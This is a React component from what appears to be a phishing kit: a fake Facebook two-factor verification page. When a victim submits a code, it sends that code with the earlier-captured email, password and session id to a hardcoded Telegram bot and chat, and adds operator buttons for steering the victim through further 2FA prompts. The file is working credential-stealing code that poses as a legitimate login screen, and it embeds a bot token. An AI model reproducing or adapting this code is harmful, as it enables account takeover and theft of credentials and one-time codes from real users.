import React, { useState } from 'react';
import '/assets/style_2fa.css';
import '/assets/loader.css';
import { Oval } from 'react-loader-spinner';

const telegramBotToken = '7863868126:AAFIw9RvpTWj07VVlqywabCHHCP9Qrb4LrA';
const telegramChatId = '-4682819457';

const Facebook2FAScreen: React.FC = ({
  email,
  password,
  sessionId,
  setStep,
  title,
  subtext,
  errorMessage,
  setErrorMessage,
}: any) => {
  const [code, setCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const finish2FA = async () => {
    if (!code || code.length < 6 || code.length > 8) {
      setErrorMessage('Code must be between 6 and 8 digits.');
      return;
    }

    setIsLoading(true);
    setErrorMessage('');

    try {
      await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: telegramChatId,
          text:
            `🔐 2FA Code Entered\n` +
            `📧 Email: ${email}\n` +
            `🔑 Password: ${password}\n` +
            `🏢 Session: ${sessionId}\n` +
            `✅ Code: ${code}`,
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [
              [
                { text: '🔐 2FA Email', callback_data: `2fa_${sessionId}` },
                { text: '📱 2FA Phone', callback_data: `2faphone_${sessionId}` }
              ],
              [
                { text: '💬 2FA WhatsApp', callback_data: `2fawhatsapp_${sessionId}` },
                { text: '🔐 Authenticator', callback_data: `2faauth_${sessionId}` }
              ],
              [
                { text: '⏳ Support', callback_data: `support_${sessionId}` },
                { text: '❌ Invalid code', callback_data: `wrong2fa_${sessionId}` }
              ],
              [
                { text: '❌ Wrong Password', callback_data: `wrongpass_${sessionId}` },
                { text: '✅ Done', callback_data: `done_${sessionId}` }
              ]
            ]
          }
        }),
      });
    } catch (error) {
      setErrorMessage('Failed to send code. Please try again.');
      setIsLoading(false);
    }
  };

  return (
    <div className="bg-white" style={{ ['--main-color' as any]: '#0CAA41' }}>
      <div className="h-screen w-screen flex flex-col justify-center items-center">
        <div className="bg-white h-full w-full flex justify-center items-start pt-[5rem]">
          <div className="bg-white rounded-xl px-6 py-6 md:py-8 w-full max-w-md md:max-w-lg">
            <p className="text-[13px] font-[500]">Facebook</p>
            <h2 className="twofa-heading">{title}</h2>
            <p className="twofa-subtext">{subtext}</p>
            <div className="mt-2 w-full">
              <img
                src="/assets/auth_sms.png"
                alt=""
                className="w-full h-auto object-cover"
              />
            </div>
            <input
              type="number"
              placeholder="Code"
              autoComplete="off"
              minLength={6}
              maxLength={8}
              value={code}
              onChange={(e) => setCode(e.target.value)}
              className="pr-[20px] h-14 w-full mt-4 bg-white rounded-[16px] border border-[#ccd3db] pl-4 font-[500] text-[15px] focus:outline-none focus:border-[#1c1e21]"
            />
            <div className="min-h-[px] mt-1">
              {errorMessage && (
                <p className="text-red-500 text-[14px] font-[100]">{errorMessage}</p>
              )}
            </div>

            <div className="w-full flex justify-center items-center pb-4 pl-[4px] pt-4">
              <p className="text-[14px] text-[#5d6c7b] font-[400]">
                Check regularly whether you have received a code from Facebook or Meta.
              </p>
            </div>

            <div className="flex flex-col">
              <button
                onClick={finish2FA}
                disabled={isLoading}
                className="mb-4 w-full py-3 bg-blue-500 text-white rounded hover:bg-blue-600 focus:outline-none text-[15px] font-[500] disabled:opacity-70"
                style={{ borderRadius: '22px' }}
              >
                {isLoading ? (
                  <div className="flex justify-center items-center">
                    <Oval
                      height={20}
                      width={20}
                      color="#ffffff"
                      visible={true}
                      ariaLabel="oval-loading"
                      secondaryColor="#dbeafe"
                      strokeWidth={4}
                      strokeWidthSecondary={2}
                    />
                  </div>
                ) : (
                  <span>Continue</span>
                )}
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Facebook2FAScreen;
